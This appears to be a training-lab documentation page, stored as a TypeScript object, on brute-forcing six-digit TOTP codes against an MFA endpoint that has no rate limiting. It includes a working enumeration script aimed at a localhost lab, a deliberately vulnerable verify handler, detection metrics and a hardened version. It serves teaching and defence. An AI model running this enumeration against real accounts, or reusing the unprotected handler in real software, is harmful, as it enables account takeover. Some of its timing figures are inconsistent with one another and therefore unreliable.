/**
 * MFA Bypass (Bruteforce) Guide
 */

import type { DocGuide } from '../docs'

export const mfaBypassGuide: DocGuide = {
  slug: 'mfa-bypass',
  title: 'MFA Bypass (Bruteforce)',
  description: 'Time-based TOTP enumeration attack',
  category: 'attack-guides',
  lastUpdated: '2025-11-14',
  content: [
    {
      type: 'heading',
      level: 1,
      content: 'MFA Bypass (Bruteforce)',
    },
    {
      type: 'paragraph',
      content: 'Multi-Factor Authentication (MFA) adds a second layer of security, but TOTP (Time-based One-Time Password) codes can be vulnerable to brute force enumeration if not properly rate-limited.',
    },
    {
      type: 'heading',
      level: 2,
      content: 'TOTP Overview',
    },
    {
      type: 'paragraph',
      content: 'TOTP generates 6-digit codes that change every 30 seconds based on:',
    },
    {
      type: 'list',
      content: [
        'Shared secret (stored on both server and user device)',
        'Current Unix timestamp (divided by 30-second intervals)',
        'HMAC-SHA1 algorithm to generate the code',
      ],
    },
    {
      type: 'code',
      language: 'python',
      content: `# TOTP code generation
import pyotp

secret = "DEVSECOPSTWENTYFOURHACKINGLAB"
totp = pyotp.TOTP(secret, interval=30)
code = totp.now()  # Returns current 6-digit code

# Code is valid for 30 seconds
# Example: "123456" is valid from 12:00:00 to 12:00:30`,
    },
    {
      type: 'heading',
      level: 2,
      content: 'The Vulnerability',
    },
    {
      type: 'paragraph',
      content: 'While TOTP has 1,000,000 possible codes (000000-999999), brute forcing is feasible because:',
    },
    {
      type: 'list',
      content: [
        'Only 6 digits = 1 million combinations',
        'Code is valid for 30 seconds (or 60 with grace period)',
        'No rate limiting on MFA verification endpoint',
        'Time window allows approximately 30 attempts per second',
        'With parallelization: 1M codes ÷ 100 threads ≈ 10K attempts each',
      ],
    },
    {
      type: 'danger',
      content: 'Without rate limiting, an attacker can enumerate all 1 million codes in under 5 minutes with proper parallelization!',
    },
    {
      type: 'heading',
      level: 2,
      content: 'Attack Flow',
    },
    {
      type: 'code',
      language: 'python',
      content: `# Step 1: Get challenge ID from password login
response = requests.post("http://localhost:8000/auth/login",
    json={"username": "admin", "password": "admin123"})
challenge_id = response.json()["challenge_id"]

# Step 2: Brute force TOTP codes
for code in range(0, 1000000):
    totp_code = f"{code:06d}"  # Format as 6 digits: 000000-999999

    response = requests.post("http://localhost:8000/auth/mfa/verify",
        json={"challenge_id": challenge_id, "code": totp_code})

    if response.status_code == 200:
        print(f"SUCCESS! Valid code: {totp_code}")
        print(f"Access token: {response.json()['access_token']}")
        break`,
    },
    {
      type: 'heading',
      level: 2,
      content: 'Step-by-Step Execution',
    },
    {
      type: 'list',
      content: [
        'Navigate to Attack Playground',
        'Find "MFA Bypass (Bruteforce)" attack card',
        'Click "Launch Attack"',
        'Enter credentials (admin/admin123)',
        'The attack will automatically obtain challenge_id',
        'Watch as TOTP codes are enumerated (000000-999999)',
        'Attack succeeds when valid code is found within current 30-second window',
        'View JWT tokens in results',
      ],
    },
    {
      type: 'info',
      content: 'This attack typically finds the valid code within 30-60 seconds with parallel enumeration, demonstrating why rate limiting on MFA endpoints is critical.',
    },
    {
      type: 'heading',
      level: 2,
      content: 'Detection Indicators',
    },
    {
      type: 'table',
      content: {
        headers: ['Metric', 'Normal Behavior', 'Attack Pattern'],
        rows: [
          ['mfa_attempts_total{status="failure"}', '1-2 failures (typo)', '100s-1000s of failures'],
          ['http_requests_total{endpoint="/auth/mfa/verify"}', '1-3 requests', '1000+ requests in seconds'],
          ['mfa_verification_duration_seconds', '< 5 seconds', 'Extends for minutes'],
        ],
      },
    },
    {
      type: 'heading',
      level: 2,
      content: 'Mitigation Strategies',
    },
    {
      type: 'list',
      content: [
        'Rate Limiting: Limit MFA attempts to 5-10 per minute per challenge_id',
        'Account Lockout: Ban IP or invalidate challenge_id after 10 failed attempts',
        'Challenge Expiration: Expire challenge_id after 5 minutes',
        'Exponential Backoff: Increase delay after each failed attempt',
        'CAPTCHA: Require human verification after N failures',
        'WebAuthn/FIDO2: Use hardware tokens instead of TOTP (phishing-resistant)',
        'Monitoring: Alert on high MFA failure rates',
      ],
    },
    {
      type: 'heading',
      level: 2,
      content: 'Why This Attack Works',
    },
    {
      type: 'paragraph',
      content: 'The attack succeeds because:',
    },
    {
      type: 'code',
      language: 'python',
      content: `# Vulnerable implementation (NO rate limiting)
@app.post("/auth/mfa/verify")
async def verify_mfa(challenge_id: str, code: str):
    # Missing: Rate limit check
    # Missing: Challenge expiration check
    # Missing: Failed attempt counter

    user = await get_user_from_challenge(challenge_id)
    totp = pyotp.TOTP(user.mfa_secret)

    if totp.verify(code):  # Vulnerable to enumeration!
        return generate_tokens(user)

    # No penalty for failed attempts!
    raise HTTPException(status_code=401, detail="Invalid code")`,
    },
    {
      type: 'heading',
      level: 2,
      content: 'Secure Implementation',
    },
    {
      type: 'code',
      language: 'python',
      content: `# Secure implementation (WITH protections)
@app.post("/auth/mfa/verify")
async def verify_mfa(challenge_id: str, code: str, request: Request):
    # 1. Check rate limit (5 attempts per minute)
    attempts = await redis.get(f"mfa_attempts:{challenge_id}")
    if attempts and int(attempts) >= 5:
        raise HTTPException(status_code=429, detail="Too many attempts")

    # 2. Check challenge expiration (5 minutes)
    challenge = await redis.get(f"challenge:{challenge_id}")
    if not challenge or is_expired(challenge, minutes=5):
        raise HTTPException(status_code=400, detail="Challenge expired")

    user = await get_user_from_challenge(challenge_id)
    totp = pyotp.TOTP(user.mfa_secret)

    if totp.verify(code):
        await redis.delete(f"mfa_attempts:{challenge_id}")
        return generate_tokens(user)

    # 3. Increment failure counter
    await redis.incr(f"mfa_attempts:{challenge_id}")
    await redis.expire(f"mfa_attempts:{challenge_id}", 60)

    # 4. Ban after 10 failures
    if int(await redis.get(f"mfa_attempts:{challenge_id}")) >= 10:
        await ban_ip(request.client.host, duration=3600)

    raise HTTPException(status_code=401, detail="Invalid code")`,
    },
    {
      type: 'warning',
      content: 'The current demo implementation has NO rate limiting on MFA verification to demonstrate the vulnerability. Real applications must implement strict rate limits!',
    },
  ],
}
